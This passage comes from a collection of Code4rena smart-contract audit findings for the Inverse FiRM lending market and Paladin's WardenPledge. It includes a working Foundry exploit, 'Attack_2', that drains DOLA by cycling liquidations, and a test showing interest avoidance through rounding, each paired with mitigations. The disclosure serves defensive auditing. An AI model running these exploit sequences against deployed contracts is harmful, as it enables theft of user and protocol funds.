$L_{fe}$ - liquidationFeeBps / 10000  $L_{fa}$ - liquidationFactorBps / 10000  $D$ - user's debt recognized by the market  $C$ - user's collateral held by the escrow  $P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.  Constraints on the parameters in the current implementation  All parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.  #### Condition for liquidation  1. Debt is over the credit limit        $D>C_f  C  P$  2. Liquidation amount is limited by liquidation factor times user debt.        $x\\le L_{fa}D$  #### Study  We will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.  After liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.  Let us see when the new health factor can be less than the previous health factor.  $\\frac {CP-x(1+L_i+L_{fe})}{D-x} < \\frac {CP}{D}$  $CP<D(1+L_i+L_{fe})$  $D>\\frac{CP}{1+L_i+L_{fe}}$  So if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.  Note that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.  Furthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.  #### Example  For $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below. We believe that these parameters are quite realistic. For these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../DBR.sol\"; import \"../Market.sol\"; import \"./FiRMTest.sol\";  contract Attack_2 is FiRMTest {     address operator;      function setUp() public {         vm.label(gov, \"operator\");         operator = gov;          collateralFactorBps = 8500;         liquidationBonusBps = 1800;         replenishmentPriceBps = 50000;          initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);          vm.startPrank(gov);         market.setLiquidationFeeBps(100);         market.setLiquidationFactorBps(5000);         vm.stopPrank();          vm.startPrank(chair);         fed.expansion(IMarket(address(market)), 1_000_000e18);         vm.stopPrank();     }       function getMaxForceReplenishable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral         uint256 currentDeficit = dbr.deficitOf(user);         uint256 limitByCollateralValue = 0;         if(market.getCollateralValue(user) > market.debts(user))         {             limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();         }          return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;     }      function getMaxLiquidatable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral          uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);         uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());          return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;     }      function userTotalValue(address user) public view returns (uint256) {         uint P = ethFeed.latestAnswer() / 1e18;         uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);         // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back         if(market.getCollateralValue(user) > market.debts(user))             totalValue += (market.getCollateralValue(user) - market.debts(user))/P;         return totalValue;     }      function testAttack_2() public {         uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same          gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral         gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation          // block 1         vm.startPrank(user);         deposit(wethTestAmount); // collateral          uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can         market.borrow(borrowAmount);          emit log_named_decimal_uint(\"Total value before exploit\", userTotalValue(user), 18);         emit log_named_uint(\"B\", market.debts(user));         emit log_named_uint(\"D\", market.debts(user));         emit log_named_uint(\"C\", market.getCollateralValue(user));         emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);          // start liquidation         uint cycle = 1;         while(cycle < 100)         {             emit log_named_uint(\"Cycle\", cycle);             uint256 liquidatable = getMaxLiquidatable(user);             if(liquidatable > 0)             {                 emit log(\"Liquidation\");                 emit log_named_uint(\"L\", liquidatable);                 market.liquidate(user, liquidatable); // liquidate as much as it can             }             else {                 emit log(\"Wait a block and force replenishment\");                 vm.warp(block.timestamp + 1);                 uint256 replenishable = getMaxForceReplenishable(user);                 emit log_named_uint(\"R\", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable                 market.forceReplenish(user, replenishable);             }               emit log_named_uint(\"D\", market.debts(user));             emit log_named_uint(\"C\", market.getCollateralValue(user));             emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);              ++ cycle;              uint256 totalValue = userTotalValue(user);             emit log_named_decimal_uint(\"Total value the user owns\",  totalValue, 18);             if(totalValue > wethTestAmount * 2)                 break; // no need to continue, the attacker already took profit from the market         }     } }  ```  The test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.  ``` > forge test -vv --match-test testAttack_2   Total value before exploit: 2.000000000000000000   B: 1360000000000000000000   D: 1360000000000000000000   C: 1600000000000000000000   H: 1.176470588235294117   Cycle: 1   Wait a block and force replenishment   R: 43125317097919   D: 1360000215626585489595   C: 1600000000000000000000   H: 1.176470401707135551   Total value the user owns: 1.999999871971714865   Cycle: 2   Liquidation   L: 680000107813292744797   D: 680000107813292744798   C: 790799871702181636800   H: 1.162940803414271107   Total value the user owns: 1.995749871297881786   Cycle: 3   Liquidation   L: 340000053906646372399   D: 340000053906646372399   C: 386199807553272457600   H: 1.135881606828542227   Total value the user owns: 1.993624870960965247   Cycle: 4   Liquidation   L: 170000026953323186199   D: 170000026953323186200   C: 183899775478817868800   H: 1.081763213657084471   Total value the user owns: 1.992562370792506977   Cycle: 5   Liquidation   L: 85000013476661593100   D: 85000013476661593100   C: 82749759441590576000   H: 0.973526427314168978   Total value the user owns: 1.993437529480197230   Cycle: 6   Liquidation   L: 42500006738330796550   D: 42500006738330796550   C: 32174751422976931200   H: 0.757052854628338029   Total value the user owns: 1.998218780238259443   Cycle: 7   Liquidation   L: 21250003369165398275   D: 21250003369165398275   C: 6887247413670110400   H: 0.324105709256676206   Total value the user owns: 2.000609405617290549 ```  ## Tools Used  Foundry  ## Recommended Mitigation Steps  Make sure the liquidation does not decrease the health index in the function `liquidate`. With this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.  ```solidity function liquidate(address user, uint repaidDebt) public {     require(repaidDebt > 0, \"Must repay positive debt\");     uint debt = debts[user];     require(getCreditLimitInternal(user) < debt, \"User debt is healthy\");     require(repaidDebt <= debt * liquidationFactorBps / 10000, \"Exceeded liquidation factor\");      // ****************************************     uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation     // ****************************************      uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola     uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount     liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;     debts[user] -= repaidDebt;     totalDebt -= repaidDebt;      dbr.onRepay(user, repaidDebt);     dola.transferFrom(msg.sender, address(this), repaidDebt);     IEscrow escrow = predictEscrow(user);     escrow.pay(msg.sender, liquidatorReward);     if(liquidationFeeBps > 0) {         uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;         if(escrow.balance() >= liquidationFee) {             escrow.pay(gov, liquidationFee);         }     }      // ****************************************     uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation     require(afterHealthFactor >= beforeHealthFactor, \"Liquidation should not decrease the health factor of the address\"); // @audit new check     // ****************************************      emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward); }  function forceReplenish(address user, uint amount) public {     uint deficit = dbr.deficitOf(user);     require(deficit > 0, \"No DBR deficit\");     require(deficit >= amount, \"Amount > deficit\");     uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;     uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;     debts[user] += replenishmentCost;     uint collateralValue = getCollateralValueInternal(user);      // ****************************************     // require(collateralValue >= debts[user], \"Exceeded collateral value\");     require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), \"Debt exceeds safe collateral limit\"); // @audit more strict limit     // ****************************************      totalDebt += replenishmentCost;     dbr.onForceReplenish(user, amount);     dola.transfer(msg.sender, replenisherReward);     emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward); } ```"}, {"title": "User can free from liquidation fee if its escrow balance is less than the calculated liquidation fee.", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/275", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610   # Vulnerability details  ## Impact User can free from liquidation fee if its escrow balance less than the calculated liquidation fee.  ## Proof of Concept If the `liquidationFeeBps` is enabled, the `gov` should receive the liquidation fee. But if user's escrow balance is less than the calculated liquidation fee, `gov` got nothing. https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             }         } ```   ## Tools Used manual review  ## Recommended Mitigation Steps User should pay all the remaining escrow balance if the calculated liquidation fee is greater than its escrow balance.  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             } else {                 escrow.pay(gov, escrow.balance());             }         } ```  "}, {"title": "`repay` function can be DOSed", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/252", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-05"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531   # Vulnerability details  ## Impact In `repay()` users can repay their debt. ``` function repay(address user, uint amount) public {         uint debt = debts[user];         require(debt >= amount, \"Insufficient debt\");         debts[user] -= amount;         totalDebt -= amount;         dbr.onRepay(user, amount);         dola.transferFrom(msg.sender, address(this), amount);         emit Repay(user, msg.sender, amount);     } ```  There is a `require` condition, that checks if the amount provided, is greater than the debt of the user. If it is, then the function reverts. This is where the vulnerability arises.  `repay` function can be frontrun by an attacker. Say an attacker pay a small amount of debt for the victim user, by frontrunning his repay transaction. Now when the victim's transaction gets executed, the `require` condition will fail, as the amount of debt is less than the amount of DOLA provided. Hence the attacker can repeat the process to DOS the victim from calling the repay function.   ## Proof of Concept  1. Victim calls repay() function to pay his debt of 500 DOLA , by providing the amount as 500 2. Now attacker saw this transaction on mempool 3. Attacker frontruns the transaction, by calling repay() with amount provided as 1 DOLA 4. Attacker's transaction get's executed first due to frontrunning, which reduces the debt of the victim user to 499 DOLA 5. Now when the victim's transaction get's executed, the debt of victim has reduced to 499 DOLA, and the amount to repay provided was 500 DOLA. Now as debt is less than the amount provided, so the require function will fail, and the victim's transaction will revert. This will prevent the victim from calling repay function  Hence an attacker can DOS the repay function for the victim user  ## Tools Used Manual review  ## Recommended Mitigation Steps Implement DOS protection"}, {"title": "User can borrow DOLA indefinitely without settling DBR deficit by keeping their debt close to the allowed maximum", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "edited-by-warden", "selected for report", "M-03"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567   # Vulnerability details  ## Impact  A user can borrow DOLA interest-free. This requires the user to precisely manage their collateral. This issue might become especially troublesome if a Market is opened with some stablecoin as the collateral (because price fluctuations would become negligible and carefully managing collateral level would be easy).  This issue is harder to exploit (but not impossible) if `gov` takes responsibility for forcing replenishment, since `gov` has a stronger economic incentive than third parties.  ## Proof of Concept  If my calculations are correct, with the current gas prices it costs about \\$5 to call `Market.forceReplenish(...)`. Thus  there is no economic incentive to do so as long as a debtor's DBR deficit is worth less than \\$5/`replenishmentIncentive` so probably around \\$100.  This is because replenishing cannot push a user's debt under the water (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567) and a user can repay their debt without having settled the DBR deficit (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531).  So, assuming the current prices, a user can: 1. Deposit some collateral 2. Borrow close to the maximum allowed amount of DOLA 3. Keep withdrawing or depositing collateral so that the collateral surplus does not exceed $100 (assuming current gas prices) 4. `repay()` their debt at any time in the future. 5. Withdraw all the collateral.  All this is possible with arbitrarily large DBR deficit because due to small collateral surplus at no point was it economical for a third party to `forceReplenish()` the user. If `gov` takes responsibility for `forceReplenish()`ing, the above procedure is still viable although the user has to maintain the collateral surplus at no more than around $5.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Allow replenishing to push the debt under the water and disallow repaying the debt with an outstanding DBR deficit. E.g.: ``` diff --git a/src/Market.sol b/src/Market.sol index 9585b85..d69b599 100644 --- a/src/Market.sol +++ b/src/Market.sol @@ -531,6 +531,7 @@ contract Market {      function repay(address user, uint amount) public {          uint debt = debts[user];          require(debt >= amount, \"Insufficient debt\"); +        require(dbr.deficitOf(user) == 0, \"DBR Deficit\");          debts[user] -= amount;          totalDebt -= amount;          dbr.onRepay(user, amount); @@ -563,8 +564,6 @@ contract Market {          uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;          uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;          debts[user] += replenishmentCost; -        uint collateralValue = getCollateralValueInternal(user); -        require(collateralValue >= debts[user], \"Exceeded collateral value\");          totalDebt += replenishmentCost;          dbr.onForceReplenish(user, amount);          dola.transfer(msg.sender, replenisherReward); ```"}, {"title": "Users can avoid paying fees if they manage to update their accrued fees periodically", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/83", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "edited-by-warden", "selected for report", "M-02"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/DBR.sol#L287   # Vulnerability details  ## Impact  While a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user's debt position in its storage at all times. Instead, the contract offers a method `accrueDueTokens` that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract's storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.  ## Proof of Concept  For reference, here is the affected code:  ~~~Solidity     function accrueDueTokens(address user) public {         uint debt = debts[user];         if(lastUpdated[user] == block.timestamp) return;         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;         dueTokensAccrued[user] += accrued;         totalDueTokensAccrued += accrued;         lastUpdated[user] = block.timestamp;         emit Transfer(user, address(0), accrued);     } ~~~  The problem is that the function updates the `lastUpdated[user]` storage variable even when `accrued` is `0`.  ### Example  Let's assume that the last update occurred at `t_0`. Further assume that the next update occurs at `t_1` with `t_1 - t_0 = 12s`. (`12s` is the current Ethereum block time) Suppose that the user's recorded `debt` position at `t_0 is `1,000,000 wei`. Then the accrued debt formula gives us the following:  ~~~ accrued = (t_1 - t_0) * debt / 365 days         = 12          * 1,000,000 / 31,536,000         = 1,000,000 / 31,536,000         = 0 (because unsigned integer division rounds down) ~~~  ### Maximizing profit  The accrued debt formula rounds towards zero if we have `(t_1 - t_0) * debt < 365 days`. This gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:  ~~~ debt_max = 365 days / 12s -1 = 2,627,999 ~~~  Notice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999. To borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:  ~~~ #loans = X / 2,627,999 ~~~  For example, to borrow 1 DOLA:  ~~~ #loans = 10^18 / 2,627,999 = 380517648599 ~~~  To borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.  ### Economical feasibility  The attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack. The dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price (\\$1,550.80), it's hardly imaginable that this attack is economically feasible at the moment.  ### Risk parameters  However, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.  Also, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset's price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:  ~~~ #loans = 10^8 / 2,627,999 ~39 ~~~  And to borrow WBTC worth \\$1,000,000 at a price of 20,746\\$/BTC, we would need 1864 small loans.  ~~~ #loans ~= 49*10^8 / 2,627,999 ~= 1864 ~~~  ### Foundry  The following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.  ~~~ $ git diff src/test/DBR.t.sol diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol index 3988cf7..8779da7 100644 --- a/src/test/DBR.t.sol +++ b/src/test/DBR.t.sol @@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {          vm.stopPrank();      }   +    function testFail_free_borrow() public { +        uint borrowAmount =  2_627_999; + +        vm.prank(address(market)); +        dbr.onBorrow(user, borrowAmount); + +        for (uint i = 12; i <= 3600; i += 12) { +            vm.warp(block.timestamp + 12); +            dbr.accrueDueTokens(user); +        } +        assertEq(dbr.deficitOf(user), 0); +    } + +      function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {          gibWeth(user, wethTestAmount);          gibDBR(user, wethTestAmount); ~~~  Output: ~~~ $ forge test --match-test testFail_free_borrow -vv [\u2806] Compiling... [\u280a] Compiling 1 files with 0.8.17 [\u2822] Solc 0.8.17 finished in 2.62s Compiler run successful  Running 1 test for src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543) Test result: FAILED. 0 passed; 1 failed; finished in 8.03ms  Failing tests: Encountered 1 failing test in src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)  Encountered a total of 1 failing tests, 0 tests succeeded ~~~  Classified as a high medium because the yields can get stolen/denied. It's not high risk because I don't see an economically feasible exploit.  ## Tools Used  VSCode, Wolramapha, Foundry  ## Recommended Mitigation Steps  * Document the risks transparently and prominently. * Re-evaluate the risks according to the specific network parameters of every network you want to deploy to. * Do not update the `lastUpdated` timestamp of the user if the computed accrued amount was zero."}, {"title": "Reward can be over- or undercounted in `extendPledge` and `increasePledgeRewardPerVote`", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/163", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L387 https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L432   # Vulnerability details  ## Impact Total reward amount in `extendPledge` and `increasePledgeRewardPerVote` can be calculated incorrectly due to cached `pledgeParams.votesDifference`, which can lead to two outcomes: 1. total reward amount is higher, thus a portion of it won't be claimable; 1. total reward amount is lower, thus the pledge target won't be reached.  ## Proof of Concept When a pledge is created, the creator chooses the target\u2013the total amount of votes they want to reach with the pledge. Based on a target, the number of missing votes is calculated, which is then used to calculated the total reward amount ([WardenPledge.sol#L325-L327](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L325-L327)): ```solidity function createPledge(     address receiver,     address rewardToken,     uint256 targetVotes,     uint256 rewardPerVote, // reward/veToken/second     uint256 endTimestamp,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant returns(uint256){     ...     // Get the missing votes for the given receiver to reach the target votes     // We ignore any delegated boost here because they might expire during the Pledge duration     // (we can have a future version of this contract using adjusted_balance)     vars.votesDifference = targetVotes - votingEscrow.balanceOf(receiver);      vars.totalRewardAmount = (rewardPerVote * vars.votesDifference * vars.duration) / UNIT;     ...   } ```  When extending a pledge or increasing a pledge reward per vote, current veToken balance of the pledge's receiver (`votingEscrow.balanceOf(receiver)`) can be different from the one it had when the pledge was created (e.g. the receiver managed to lock more CRV or some of locked tokens have expired). However `pledgeParams.votesDifference` is not recalculated ([WardenPledge.sol#L387](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L387), [WardenPledge.sol#L432](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L432)): ```solidity function extendPledge(     uint256 pledgeId,     uint256 newEndTimestamp,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant {     ...     Pledge storage pledgeParams = pledges[pledgeId];     ...     uint256 totalRewardAmount = (pledgeParams.rewardPerVote * pledgeParams.votesDifference * addedDuration) / UNIT;     ... }  function increasePledgeRewardPerVote(     uint256 pledgeId,     uint256 newRewardPerVote,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant {     ...     Pledge storage pledgeParams = pledges[pledgeId];     ...     uint256 totalRewardAmount = (rewardPerVoteDiff * pledgeParams.votesDifference * remainingDuration) / UNIT;     ... } ```  This can lead to two consequences: 1. When receiver's veToken balance has increased (i.e. `votesDifference` got in fact smaller), pledge creator will overpay for pledge extension and pledge reward per vote increase. This extra reward cannot be received by pledgers because a receiver cannot get more votes than `pledgeParams.targetVotes` (which is not updated when modifying a pledge):     ```solidity     function _pledge(uint256 pledgeId, address user, uint256 amount, uint256 endTimestamp) internal {         ...         // Check that this will not go over the Pledge target of votes         if(delegationBoost.adjusted_balance_of(pledgeParams.receiver) + amount > pledgeParams.targetVotes) revert Errors.TargetVotesOverflow();         ...     }     ``` 1. When receiver's veToken balance has decreased (i.e. `votesDifference` got in fact bigger), the pledge target cannot be reached because the reward amount was underpaid in `extendPledge`/`increasePledgeRewardPerVote`.  ## Tools Used Manual review ## Recommended Mitigation Steps Consider updating `votesDifference` when extending a pledge or increasing a pledge reward per vote."}, {"title": "Pledges that contain delisted tokens can be extended to continue using delisted reward tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-04"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L368-L404   # Vulnerability details  ## Impact  Delisted reward tokens can continue to be use by extending current pledges that already use it  ## Proof of Concept      if(pledgeId >= pledgesIndex()) revert Errors.InvalidPledgeID();     address creator = pledgeOwner[pledgeId];     if(msg.sender != creator) revert Errors.NotPledgeCreator();       Pledge storage pledgeParams = pledges[pledgeId];     if(pledgeParams.closed) revert Errors.PledgeClosed();     if(pledgeParams.endTimestamp <= block.timestamp) revert Errors.ExpiredPledge();     if(newEndTimestamp == 0) revert Errors.NullEndTimestamp();     uint256 oldEndTimestamp = pledgeParams.endTimestamp;     if(newEndTimestamp != _getRoundedTimestamp(newEndTimestamp) || newEndTimestamp < oldEndTimestamp) revert Errors.InvalidEndTimestamp();       uint256 addedDuration = newEndTimestamp - oldEndTimestamp;     if(addedDuration < minDelegationTime) revert Errors.DurationTooShort();     uint256 totalRewardAmount = (pledgeParams.rewardPerVote * pledgeParams.votesDifference * addedDuration) / UNIT;     uint256 feeAmount = (totalRewardAmount * protocalFeeRatio) / MAX_PCT ;     if(totalRewardAmount > maxTotalRewardAmount) revert Errors.IncorrectMaxTotalRewardAmount();     if(feeAmount > maxFeeAmount) revert Errors.IncorrectMaxFeeAmount();  During the input validation checks, it's never checked that reward token of the pledge being extended is still a valid reward token. This would allow creators using delisted tokens to continue using them as long as they wanted, by simply extending their currently active pledges.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add the following check during the input validation block:      +   if(minAmountRewardToken[rewardToken] == 0) revert Errors.TokenNotWhitelisted();"}, {"title": "Pledge can be silently closed by calling retrievePledgeRewards.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/111", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "grade-b", "Q-28"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L451-L452 https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L469   # Vulnerability details  ## Impact Pledge can be silently closed by calling retrievePledgeRewards.  ## Proof of Concept The comments for `retrievePledgeRewards` says: https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L451-L452 ```     /**     * @notice Retrieves all non distributed rewards from a closed Pledge     * @dev Retrieves all non distributed rewards from a closed Pledge & send them to the given receiver     * @param pledgeId ID fo the Pledge     * @param receiver Address to receive the remaining rewards     */ ``` There's no line of code in `retrievePledgeRewards` method to ensure the pledge is indeed closed, instead the pledge is set to `closed` state if it is not closed. https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L469 ```solidity if(!pledgeParams.closed) pledgeParams.closed = true;  ``` This implementation doesn't follow the sepc and the pledge is closed silently(without triggering the `ClosePledge` event) if the pledge is not closed, which could lead to the pledge creator unexpectedly close the pledge that he doesn't intend to.  ## Tools Used manual review  ## Recommended Mitigation Steps `retrievePledgeRewards` can only retrieve distribution rewards from a closed pledge. ```solidity function retrievePledgeRewards(uint256 pledgeId, address receiver) external whenNotPaused nonReentrant {        ......          // Get the current remaining amount of rewards not distributed for the Pledge         uint256 remainingAmount = pledgeAvailableRewardAmounts[pledgeId];          if (!pledgeParams.closed) revert Errors.PledgeNotClosed();          if(remainingAmount > 0) {             // Transfer the non used rewards and reset storage             pledgeAvailableRewardAmounts[pledgeId] = 0;              IERC20(pledgeParams.rewardToken).safeTransfer(receiver, remainingAmount);              emit RetrievedPledgeRewards(pledgeId, receiver, remainingAmount);          }     } ```"}, {"title": "Lack of minimum pledge time requirement", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/110", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "Q-27"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L233-L237   # Vulnerability details  ## Impact The `_pledge()` function contains checks ensuring that the `endTimestamp` is not greater than the `pledgeParams.endTimestamp` and that `endTimestamp` is rounded to the week, but it does not check that `endTimestamp` is larger than some minimum pledge time. Currently, an \"attacker\" or griefer can pledge a large amount for a small amount of time. They can pledge for a length of time where the receiver may not even have enough time to submit a transaction to take advantage of the boost.  This most likely will not provide a large monetary incentive to the attacker, but the pledge creator's reward funds will be paid out for no reason.  ## Proof of Concept - A malicious actor realizes that the week timestamp is approaching in 10 minutes.  - They pledge a large amount of points to the pledge creator with the `endTimestamp` equal to the upcoming week timestamp (10 minutes away). - The receiver doesn't feasibly have enough time to act while the boost is active.  - The malicious actor receives some reward without providing any benefit to the receiver.  ## Tools Used  ## Recommended Mitigation Steps Add a check for `MIN_PLEDGE_TIME`, a constant equal to a value that makes sense, e.g. 86400 (1 day)."}, {"title": "Pledge may be out of reward due to the decay in veCRV balance. targetVotes is never reached.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/91", "labels": ["bug", "help wanted", "2 (Med Risk)", "judge review requested", "primary issue", "sponsor confirmed", "selected for report", "M-03"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L325-L335 https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L259-L268   # Vulnerability details  ## Impact Pledge may be out of reward due to the decay in veCRV balance. The receiver may lose his reward given to boosters but get nothing in return since her targetVotes is never reached.  ## Proof of Concept According to Curve documentation at https://curve.readthedocs.io/dao-vecrv.html  ``` A user\u2019s veCRV balance decays linearly as the remaining time 